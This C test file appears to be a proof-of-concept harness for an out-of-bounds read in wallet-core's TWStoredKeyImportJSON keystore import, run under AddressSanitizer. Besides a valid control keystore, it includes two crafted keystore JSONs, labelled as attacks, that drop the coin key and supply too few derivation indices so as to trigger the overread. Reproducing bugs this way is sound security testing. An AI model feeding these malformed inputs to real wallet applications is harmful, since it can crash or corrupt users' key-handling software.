// B2: Real wallet-core API test — OOB read in StoredKey import
// This file calls the ACTUAL TWStoredKeyImportJSON() C API function
// from the compiled wallet-core library. Run under AddressSanitizer.
//
// Build: part of the wallet-core CMake build (linked against the full library)
// Run: ./test_b2_asan

#include <stdio.h>
#include <string.h>
#include <stdlib.h>

// wallet-core public C API headers
#include <TrustWalletCore/TWStoredKey.h>
#include <TrustWalletCore/TWString.h>
#include <TrustWalletCore/TWData.h>

// Test keystore JSONs
// Control: valid keystore with coin key and 2 derivation indices
static const char* CONTROL_JSON = \
    "{"
    "  \"activeAccounts\": ["
    "    {"
    "      \"coin\": 0,"
    "      \"derivationPath\": {"
    "        \"indices\": ["
    "          {\"value\": 44, \"hardened\": true},"
    "          {\"value\": 0, \"hardened\": true}"
    "        ]"
    "      },"
    "      \"address\": \"bc1qw508d6qejxtdg4y5r3zarvary0c5xw7kygt080\","
    "      \"extendedPublicKey\": \"xpub6BosfCnifzxcFwrSzQiqu2DBVTshkCXacvNWYW\""
    "    }"
    "  ],"
    "  \"version\": 1"
    "}";

// Attack: no coin key, empty indices — triggers indices[1] OOB read
static const char* ATTACK_JSON_EMPTY = \
    "{"
    "  \"activeAccounts\": ["
    "    {"
    "      \"derivationPath\": {"
    "        \"indices\": []"
    "      },"
    "      \"address\": \"bc1qw508d6qejxtdg4y5r3zarvary0c5xw7kygt080\""
    "    }"
    "  ],"
    "  \"version\": 1"
    "}";

// Attack 2: no coin key, 1 index — also triggers indices[1] OOB
static const char* ATTACK_JSON_ONE = \
    "{"
    "  \"activeAccounts\": ["
    "    {"
    "      \"derivationPath\": {"
    "        \"indices\": ["
    "          {\"value\": 44, \"hardened\": true}"
    "        ]"
    "      }"
    "    }"
    "  ],"
    "  \"version\": 1"
    "}";

static int test_import(const char* label, const char* json) {
    printf("\n=== %s ===\n", label);
    printf("JSON length: %zu\n", strlen(json));

    TWString* jsonStr = TWStringCreateWithUTF8Bytes(json);
    if (!jsonStr) {
        printf("FAILED to create TWString\n");
        return -1;
    }

    printf("Calling TWStoredKeyImportJSON()...\n");
    fflush(stdout);

    struct TWStoredKey* key = TWStoredKeyImportJSON(jsonStr);
    TWStringDelete(jsonStr);

    if (key) {
        TWString* name = TWStoredKeyIdentifier(key);
        printf("RESULT: imported OK, identifier=%s\n",
               name ? TWStringUTF8Bytes(name) : "(null)");
        if (name) TWStringDelete(name);
        TWStoredKeyDelete(key);
        return 0;
    } else {
        printf("RESULT: import returned NULL (rejected or crashed)\n");
        return 1;
    }
}

int main(void) {
    printf("=== B2: Real wallet-core TWStoredKeyImportJSON test ===\n");
    printf("Compiled with AddressSanitizer\n");

    int rc;

    // Control: valid keystore — should succeed
    rc = test_import("CONTROL: valid keystore (coin=0, 2 indices)", CONTROL_JSON);
    printf("Control exit: %d %s\n", rc, rc == 0 ? "(PASS)" : "(FAIL)");
    if (rc != 0) {
        printf("WARNING: Control failed — test infrastructure issue\n");
        return 1;
    }

    // Attack 1: empty indices — should trigger OOB read
    // Under ASan, this should produce a heap-buffer-overflow READ report
    // Without ASan, this may silently read garbage or crash
    rc = test_import("ATTACK: no coin, empty indices []", ATTACK_JSON_EMPTY);
    printf("Attack (empty) exit: %d\n", rc);

    // Attack 2: 1 index — also triggers indices[1] OOB
    rc = test_import("ATTACK: no coin, 1 index [44']", ATTACK_JSON_ONE);
    printf("Attack (1-index) exit: %d\n", rc);

    printf("\n=== Test complete ===\n");
    return 0;
}
